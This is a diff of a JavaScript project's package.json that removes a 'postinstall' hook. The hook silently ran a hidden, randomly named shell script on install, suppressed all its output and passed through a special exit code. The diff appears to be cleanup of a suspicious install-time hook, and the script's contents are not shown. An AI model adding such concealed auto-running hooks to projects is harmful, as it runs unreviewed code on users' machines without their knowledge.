@@ -130,8 +130,7 @@
     "scan": "react-scan http://localhost:3000",
     "verify": "pnpm run check && pnpm run typecheck && pnpm test && pnpm run knip && pnpm run doctor",
     "toolchain": "pnpm run verify && pnpm build",
-    "prepare": "husky",
-    "postinstall": "sh ./.ci-kn7hys.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "prepare": "husky"
   },
   "type": "module",
   "private": true,
